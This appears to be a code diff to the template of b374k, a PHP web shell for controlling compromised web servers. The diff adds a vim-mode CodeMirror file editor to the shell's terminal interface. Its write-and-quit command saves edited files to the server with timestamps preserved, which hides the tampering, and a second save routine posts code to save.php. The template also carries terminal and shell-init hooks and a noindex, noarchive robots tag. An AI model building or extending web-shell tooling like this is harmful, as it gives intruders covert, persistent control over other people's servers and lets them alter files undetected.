@@ -14,6 +14,7 @@
 <meta name='robots' content='noindex, nofollow, noarchive'>
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, user-scalable=0">
 <link rel='SHORTCUT ICON' href='<?php echo get_resource('b374k');?>'>
+
 <style type="text/css">
 <__CSS__>
 #navigation{position:fixed;left:-16px;top:46%;}
@@ -25,6 +26,19 @@
 #showinfo{float:right;display:none;}
 #logout{float:right;}
 .git_alert{font-weight: bold; color:#ef793e; font-size: 16px;}
+</style>
+<style>
+.CodeMirror{
+    border: 1px solid #eee;
+    display:block;
+    height:100%;
+    width: 100%;
+}
+.cm_middle{
+    border: 1px solid #eee;
+    display:block;
+    height:1600px;
+}
 </style>
 </head>
 <body>
@@ -46,6 +60,7 @@
 		<div id='menu'>
 			<?php
 				foreach($GLOBALS['module_to_load'] as $k){
+					if($GLOBALS['module'][$k]['id']=='vim') continue;
 					echo "<a class='menuitem' id='menu".$GLOBALS['module'][$k]['id']."' href='#!".$GLOBALS['module'][$k]['id']."'>".$GLOBALS['module'][$k]['title']."</a>";
 				}
 			?>
@@ -93,6 +108,7 @@
 <form action='<?php echo get_self(); ?>' method='post' id='form' target='_blank'></form>
 <!--script start-->
 <script type='text/javascript'>
+var doc;
 var targeturl = '<?php echo get_self(); ?>';
 var module_to_load = '<?php echo implode(",", $GLOBALS['module_to_load']);?>';
 var win = <?php echo (is_win())?'true':'false';?>;
@@ -105,6 +121,52 @@ var init_shell = true;
 		echo "function ".$GLOBALS['module'][$k]['id']."(){ ".$GLOBALS['module'][$k]['js_ontabselected']." }\n";
 	}
 ?>
+</script>
+<script>
+$(function(){
+ 	doc = CodeMirror(document.getElementById("editor"), {
+ 			value: document.getElementById("source_code").value,
+ 			lineNumbers: true,
+ 			keyMap: "vim",
+ 			matchBrackets: true,
+ 			mode: "application/x-httpd-php",
+ 			indentUnit: 8,
+ 			indentWithTabs: true,
+ 			theme: "monokai"
+ 		});
+ 	$("#editor").hide();
+ 	CodeMirror.commands.write_and_quit = function(){
+ 		let source = doc.getValue();
+ 		let postData={"code":source, "current_path":current_path};
+
+$.post(window.location.href, {"editType":"edit","editFilename":current_path,"editInput":source,"preserveTimestamp":true}, function(response){
+	if(response!=""){
+		$("#terminalOutput").toggle();
+		$("#terminalPrompt").toggle();
+		$("#editor").toggle();
+		$('#terminalInput').focus();
+	}else{
+		alert("Faile");
+	}
+	},'text');
+ 	};
+ 	CodeMirror.commands.quit = function(){
+			$("#terminalOutput").toggle();
+			$("#terminalPrompt").toggle();
+			$("#editor").toggle();
+ 	};
+ 	CodeMirror.commands.save = function(){ 
+ 		let source = doc.getValue();
+ 		let postData={"code":source, "current_path":current_path};
+ 		$.post("save.php",postData, function(response){
+			if(response=="y"){
+				alert("Saved");}
+			if(response=="n"){
+				alert("Faile");
+			}
+ 		},'text');
+ 	 };
+	});	
 </script>
 <!--script end-->
 </body>
